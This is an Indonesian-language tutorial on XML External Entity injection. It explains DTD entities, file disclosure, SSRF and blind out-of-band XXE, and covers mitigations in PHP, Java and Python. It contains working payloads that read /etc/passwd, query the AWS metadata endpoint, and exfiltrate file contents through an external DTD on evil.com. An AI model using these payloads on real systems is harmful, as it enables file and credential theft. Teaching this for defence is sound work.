# 📑 XML External Entity (XXE) Injection

## 1. Definisi
**XML External Entity (XXE) Injection** adalah celah keamanan pada aplikasi web yang memungkinkan penyerang untuk mengintervensi pemrosesan data XML aplikasi. Hal ini terjadi ketika parser XML yang dikonfigurasi kurang aman memproses input XML yang mengandung referensi ke entitas eksternal (*external entity*). Dengan mengeksploitasi XXE, penyerang dapat membaca file sensitif pada server lokal (seperti file konfigurasi, `/etc/passwd`), memicu serangan SSRF (Server-Side Request Forgery) ke jaringan internal, hingga menyebabkan kondisi *Denial of Service* (DoS).

---

## 2. Memahami XML DTD & External Entities

XML (*eXtensible Markup Language*) menggunakan *Document Type Definition* (DTD) untuk mendefinisikan struktur dokumen. Di dalam DTD, kita dapat mendefinisikan "Entitas" (semacam variabel).

* **Entitas Internal (Internal Entity)**:
  Berperan seperti variabel lokal biasa:
  ```xml
  <!DOCTYPE foo [ <!ENTITY myvar "Halo Kamar Kamsib"> ]>
  <root>&myvar;</root>
  ```
  Saat diproses, `&myvar;` akan digantikan menjadi `"Halo Kamar Kamsib"`.

* **Entitas Eksternal (External Entity)**:
  Mengambil nilai dari luar sistem menggunakan kata kunci `SYSTEM` diikuti dengan URI (seperti file lokal atau URL):
  ```xml
  <!DOCTYPE foo [ <!ENTITY myext SYSTEM "file:///etc/passwd"> ]>
  <root>&myext;</root>
  ```
  Jika parser XML tidak dikonfigurasi dengan aman, ia akan membuka file `/etc/passwd` di server dan menyisipkan isinya ke dalam tag `<root>` yang nantinya ditampilkan kembali ke layar penyerang.

---

## 3. Jenis-Jenis Eksploitasi XXE

### A. Membaca File Lokal (File Disclosure)
Penyerang mendefinisikan entitas eksternal yang merujuk pada file lokal sistem operasi server dan menampilkannya pada respon aplikasi web.
* **Target File Umum**:
  - Linux: `file:///etc/passwd`, `file:///etc/hosts`
  - Windows: `file:///c:/windows/win.ini`, `file:///c:/windows/system32/drivers/etc/hosts`

### B. Memicu SSRF via XXE
Penyerang mengganti URI file lokal menjadi URL jaringan internal atau metadata cloud.
* **Contoh Target**:
  `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`

### C. Blind XXE (Out-of-Band - OOB)
Terjadi jika aplikasi memproses XML dan rentan terhadap XXE, namun tidak menampilkan hasil output atau error XML ke layar respon web sama sekali. Penyerang mengeksploitasinya dengan cara memaksa server mengirimkan isi file sensitif ke server eksternal milik penyerang melalui koneksi HTTP atau query DNS.

---

## 4. Contoh Payload XXE

### 🔓 Payload 1: Membaca File Lokal (Linux `/etc/passwd`)
Kirimkan payload XML berikut pada request body (biasanya dengan header `Content-Type: application/xml` atau `text/xml`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 📡 Payload 2: SSRF via XXE (Akses Metadata AWS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### 🕵️ Payload 3: Blind XXE (Out-of-Band Data Exfiltration)
Penyerang membuat file DTD eksternal di server mereka (misal di `http://evil.com/evil.dtd`):
```xml
<!-- Isi dari http://evil.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?data=%file;'>">
%eval;
%exfiltrate;
```
Kemudian, kirimkan payload XML ini ke aplikasi web korban:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
  %remote;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>2</storeId>
</stockCheck>
```
* **Cara Kerja**: Server korban memuat file DTD eksternal dari `evil.com`, membaca `/etc/passwd`, lalu mengirimkannya sebagai parameter query ke `http://evil.com/?data=ISI_FILE_PASSWD`. Penyerang tinggal memeriksa log web server mereka.

---

## 5. Mitigasi (Pencegahan)

Hampir semua kerentanan XXE muncul karena parser XML bawaan (seperti `libxml2` di PHP, atau parser XML bawaan di Java) secara default mengaktifkan pemrosesan entitas eksternal (*external entities*) dan DTD eksternal.

### ✔️ 1. Menonaktifkan DTD (Metode Paling Aman)
Cara terbaik untuk mencegah XXE adalah menonaktifkan fitur pemrosesan DTD (*Document Type Declarations*) secara total pada parser XML yang digunakan aplikasi.

* **Pencegahan di PHP (menggunakan libxml)**:
  Sebelum memproses XML, panggil fungsi `libxml_disable_entity_loader(true)` (untuk PHP < 8.0). Pada PHP 8.0+, pemrosesan entitas eksternal sudah dinonaktifkan secara bawaan.
  ```php
  // Mencegah pemrosesan entitas eksternal
  libxml_use_internal_errors(true);
  libxml_disable_entity_loader(true); // Wajib untuk PHP versi lama
  $xml = simplexml_load_string($xml_data);
  ```

* **Pencegahan di Java (DocumentBuilderFactory)**:
  Konfigurasikan parser Java untuk menolak DTD eksternal secara total:
  ```java
  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
  String FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
  dbf.setFeature(FEATURE, true);
  ```

* **Pencegahan di Python (defusedxml)**:
  Hindari penggunaan modul bawaan `xml.etree` atau `xml.dom` secara langsung jika memproses input XML yang tidak terpercaya. Gunakan modul aman **defusedxml**:
  ```python
  from defusedxml.ElementTree import parse
  et = parse('input.xml') # Aman dari XXE
  ```

---

## 6. Referensi Terpercaya
* [PortSwigger Web Security Academy: XML External Entity Injection](https://portswigger.net/web-security/xxe)
* [OWASP Cheat Sheet Series: XML External Entity Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [XXE Injection Payload List by PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XML%20External%20Entity)
